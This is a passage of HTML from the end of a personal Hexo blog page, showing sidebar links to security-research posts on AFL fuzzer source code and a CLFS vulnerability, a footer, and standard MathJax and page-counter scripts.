datetime="2022-03-13T07:04:50.000Z" title="Created 2022-03-13 15:04:50">2022-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/13/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-gcc/" title="AFL源码阅读 - afl-gcc">AFL源码阅读 - afl-gcc</a><time datetime="2022-03-13T05:22:50.000Z" title="Created 2022-03-13 13:22:50">2022-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/05/CVE-2021-43226-%EF%BC%9ACLFS-%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" title="CVE-2021-43226 ：CLFS 中的栈溢出漏洞">CVE-2021-43226 ：CLFS 中的栈溢出漏洞</a><time datetime="2022-02-05T06:56:21.000Z" title="Created 2022-02-05 14:56:21">2022-02-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Vergissmeinnicht</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>